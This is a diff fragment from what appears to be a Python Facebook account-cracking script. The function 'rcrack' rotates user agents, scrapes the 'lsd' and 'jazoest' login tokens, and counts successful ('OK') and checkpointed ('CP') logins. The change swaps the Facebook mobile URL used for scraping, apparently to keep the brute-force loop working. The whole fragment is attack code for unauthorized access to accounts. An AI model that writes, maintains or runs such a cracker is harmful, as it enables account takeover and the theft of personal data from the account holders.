@@ -223,7 +223,7 @@ def rcrack(uid,pwx,tl):
 			sys.stdout.write('\r [\033[1;92mFARAZ\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
 			sys.stdout.flush()
 			pro = random.choice(agents)
-			free_fb = session.get('https://p.facebook.com/').text
+			free_fb = session.get('https://mobile.facebook.com/?_rdr&tbua=1').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
